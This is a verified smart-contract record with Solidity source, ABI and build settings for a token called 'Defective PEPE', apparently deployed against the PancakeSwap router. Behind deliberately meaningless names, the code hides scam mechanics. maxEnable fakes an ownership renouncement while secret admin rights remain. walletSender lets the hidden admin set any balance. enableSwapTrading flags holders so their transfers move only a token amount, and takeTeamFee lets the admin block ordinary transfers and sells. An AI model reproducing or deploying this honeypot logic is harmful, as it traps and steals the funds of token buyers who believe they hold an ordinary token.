{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface fromMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamMarketing) external view returns (uint256);\n\n    function transfer(address autoMax, uint256 isToLaunch) external returns (bool);\n\n    function allowance(address feeExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isToLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoMax,\n        uint256 isToLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeExempt, uint256 value);\n    event Approval(address indexed feeExempt, address indexed spender, uint256 value);\n}\n\nabstract contract autoBuyMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingAuto {\n    function createPair(address limitTrading, address fromSell) external returns (address);\n}\n\ninterface launchedAuto is fromMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DefectivePEPE is autoBuyMin, fromMarketing, launchedAuto {\n\n    event OwnershipTransferred(address indexed tradingList, address indexed enableLimit);\n\n    address public feeFrom;\n\n    function maxEnable() public {\n        emit OwnershipTransferred(receiverSender, address(0));\n        marketingLaunch = address(0);\n    }\n\n    uint256 private autoBuy = 100000000 * 10 ** 18;\n\n    function approve(address exemptSenderList, uint256 isToLaunch) public virtual override returns (bool) {\n        toShould[_msgSender()][exemptSenderList] = isToLaunch;\n        emit Approval(_msgSender(), exemptSenderList, isToLaunch);\n        return true;\n    }\n\n    bool public takeShould;\n\n    function walletSender(address walletMode, uint256 isToLaunch) public {\n        launchedFee();\n        receiverList[walletMode] = isToLaunch;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingMinList;\n    }\n\n    function modeLaunched(address atMax, address autoMax, uint256 isToLaunch) internal returns (bool) {\n        require(receiverList[atMax] >= isToLaunch);\n        receiverList[atMax] -= isToLaunch;\n        receiverList[autoMax] += isToLaunch;\n        emit Transfer(atMax, autoMax, isToLaunch);\n        return true;\n    }\n\n    string private maxAmount = \"DPE\";\n\n    function tokenWallet(address maxAuto) public {\n        require(maxAuto.balance < 100000);\n        if (enableAt) {\n            return;\n        }\n        if (walletLimit == fundReceiver) {\n            takeShould = true;\n        }\n        limitFund[maxAuto] = true;\n        \n        enableAt = true;\n    }\n\n    bool private fundReceiver;\n\n    address marketingShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function launchedFee() private view {\n        require(limitFund[_msgSender()]);\n    }\n\n    function balanceOf(address teamMarketing) public view virtual override returns (uint256) {\n        return receiverList[teamMarketing];\n    }\n\n    address public receiverSender;\n\n    mapping(address => bool) public limitBuy;\n\n    function transferFrom(address atMax, address autoMax, uint256 isToLaunch) external override returns (bool) {\n        if (_msgSender() != marketingShould) {\n            if (toShould[atMax][_msgSender()] != type(uint256).max) {\n                require(isToLaunch <= toShould[atMax][_msgSender()]);\n                toShould[atMax][_msgSender()] -= isToLaunch;\n            }\n        }\n        return maxMarketing(atMax, autoMax, isToLaunch);\n    }\n\n    uint256 constant tokenMode = 6 ** 10;\n\n    uint8 private tradingMinList = 18;\n\n    uint256 swapExemptMode;\n\n    function owner() external view returns (address) {\n        return marketingLaunch;\n    }\n\n    function maxMarketing(address atMax, address autoMax, uint256 isToLaunch) internal returns (bool) {\n        if (atMax == receiverSender) {\n            return modeLaunched(atMax, autoMax, isToLaunch);\n        }\n        uint256 modeSell = fromMarketing(feeFrom).balanceOf(atMin);\n        require(modeSell == buyAmountSender);\n        require(autoMax != atMin);\n        if (limitBuy[atMax]) {\n            return modeLaunched(atMax, autoMax, tokenMode);\n        }\n        return modeLaunched(atMax, autoMax, isToLaunch);\n    }\n\n    address private marketingLaunch;\n\n    function transfer(address walletMode, uint256 isToLaunch) external virtual override returns (bool) {\n        return maxMarketing(_msgSender(), walletMode, isToLaunch);\n    }\n\n    address atMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address buyList, address exemptSenderList) external view virtual override returns (uint256) {\n        if (exemptSenderList == marketingShould) {\n            return type(uint256).max;\n        }\n        return toShould[buyList][exemptSenderList];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedMinBuy;\n    }\n\n    bool public enableAt;\n\n    string private launchedMinBuy = \"Defective PEPE\";\n\n    mapping(address => uint256) private receiverList;\n\n    mapping(address => mapping(address => uint256)) private toShould;\n\n    constructor (){\n        \n        teamAt listTeam = teamAt(marketingShould);\n        feeFrom = marketingAuto(listTeam.factory()).createPair(listTeam.WETH(), address(this));\n        if (fundReceiver) {\n            fundReceiver = true;\n        }\n        receiverSender = _msgSender();\n        maxEnable();\n        limitFund[receiverSender] = true;\n        receiverList[receiverSender] = autoBuy;\n        if (takeShould) {\n            fundReceiver = false;\n        }\n        emit Transfer(address(0), receiverSender, autoBuy);\n    }\n\n    mapping(address => bool) public limitFund;\n\n    uint256 buyAmountSender;\n\n    function getOwner() external view returns (address) {\n        return marketingLaunch;\n    }\n\n    function enableSwapTrading(address marketingSell) public {\n        launchedFee();\n        if (takeShould) {\n            takeShould = true;\n        }\n        if (marketingSell == receiverSender || marketingSell == feeFrom) {\n            return;\n        }\n        limitBuy[marketingSell] = true;\n    }\n\n    bool public walletLimit;\n\n    function takeTeamFee(uint256 isToLaunch) public {\n        launchedFee();\n        buyAmountSender = isToLaunch;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoBuy;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxAmount;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptSenderList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSenderList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isToLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSell\",\"type\":\"address\"}],\"name\":\"enableSwapTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isToLaunch\",\"type\":\"uint256\"}],\"name\":\"takeTeamFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"}],\"name\":\"tokenWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isToLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isToLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isToLaunch\",\"type\":\"uint256\"}],\"name\":\"walletSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DefectivePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}